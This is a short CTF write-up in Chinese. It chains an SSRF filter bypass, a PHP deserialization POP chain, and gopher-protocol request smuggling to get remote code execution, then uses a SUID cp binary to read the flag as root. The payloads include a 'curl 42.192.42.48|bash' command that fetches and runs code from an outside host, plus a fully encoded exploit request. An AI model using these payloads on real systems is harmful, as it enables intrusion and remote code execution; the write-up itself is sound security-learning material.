ban了127.0.0.1 可以用0.0.0.0替代
8082端口开了一个php服务器，存在反序列化漏洞，构造pop链如下进行反弹shell
```php
<?php 
class A{
    public $commad;
    public function backdoor(){
        exec($this->commad);
    }
    public function info(){
        phpinfo();
    }
}
class B{
    public $a;
    public $b;
    public $c;
    public function __toString(){
        return call_user_func_array($this->a,$this->b);
    }
}
class C{
    public $a;
    public function __construct(){
        $this->a = "Welcome to ZJNUCTF";
    }
    public function __destruct(){
        echo $this->a;
    }
}
$a = new A;
$b = new B;
$a->commad = "curl 42.192.42.48|bash";
$b->a = array($a,"backdoor");
$b ->b = array();
$c = new C;
$c->a = $b;
echo serialize($c);
```

```
POST / HTTP/1.1
Host: 0.0.0.0:8888
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 236

ser=O%3a1%3a"C"%3a1%3a{s%3a1%3a"a"%3bO%3a1%3a"B"%3a3%3a{s%3a1%3a"a"%3ba%3a2%3a{i%3a0%3bO%3a1%3a"A"%3a1%3a{s%3a6%3a"commad"%3bs%3a22%3a"curl+42.192.42.48|bash"%3b}i%3a1%3bs%3a8%3a"backdoor"%3b}s%3a1%3a"b"%3ba%3a0%3a{}s%3a1%3a"c"%3bN%3b}}
```
编码两次后使用gopher协议发送到8082端口

```
gopher://0.0.0.0/_POST%2520%252F%2520HTTP%252F1%252E1%250AHost%253A%25200%252E0%252E0%252E0%253A8888%250AAccept%252DEncoding%253A%2520gzip%252C%2520deflate%250AContent%252DType%253A%2520application%252Fx%252Dwww%252Dform%252Durlencoded%250AContent%252DLength%253A%2520236%250A%250Aser%253DO%25253a1%25253a%2522C%2522%25253a1%25253a%257Bs%25253a1%25253a%2522a%2522%25253bO%25253a1%25253a%2522B%2522%25253a3%25253a%257Bs%25253a1%25253a%2522a%2522%25253ba%25253a2%25253a%257Bi%25253a0%25253bO%25253a1%25253a%2522A%2522%25253a1%25253a%257Bs%25253a6%25253a%2522commad%2522%25253bs%25253a22%25253a%2522curl%252B42%252E192%252E42%252E48%257Cbash%2522%25253b%257Di%25253a1%25253bs%25253a8%25253a%2522backdoor%2522%25253b%257Ds%25253a1%25253a%2522b%2522%25253ba%25253a0%25253a%257B%257Ds%25253a1%25253a%2522c%2522%25253bN%25253b%257D%257D
```
suid提权
```
find / -perm -4000 -user root 2>/dev/null
```
可以发现给```/bin/cp```加了s位
即可以以root权限执行cp命令
这时候想到可以通过将/flag直接cp到/dev/stdout来输出到终端上
但此时反弹shell得到的shell不是交互shell，可以使用script命令来模拟交互shell
```
script -q -c "cp /flag /dev/stdout" /dev/null
```